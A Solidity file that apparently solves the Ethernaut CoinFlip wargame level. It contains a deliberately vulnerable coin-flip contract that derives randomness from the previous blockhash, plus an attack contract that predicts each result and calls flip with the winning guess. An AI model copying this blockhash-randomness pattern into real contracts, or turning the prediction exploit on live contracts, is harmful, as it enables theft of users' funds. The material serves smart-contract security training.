pragma solidity ^0.4.18;

contract CoinFlip {
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number-1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}

contract CoinFlipAttack {
  CoinFlip coinFlipContract;
  address coinFlipInstanceAddress = 0x688c6a9f08122a4f41a5ff09696d03943ab9ca58; //initialise coinFlip with your Ethernaut instance address
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    coinFlipContract = CoinFlip(coinFlipInstanceAddress); //initialise contract within our constructor
  }

  function predict() public view returns (bool){
    //used to get the result of the coin fliphack
    //to achieve this, we exploit the deterministic nature of deciding the coinFlip result via the blockhash of the corresponding block number
    uint256 blockValue = uint256(blockhash(block.number-1));
    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
    return coinFlip == 1 ? true : false;
  }

  function exploit() public {
    bool guess = predict(); //call the predict method to get the correct answer beforehand
    coinFlipContract.flip(guess); //pass into the instantiated coinFlipContract
  }
}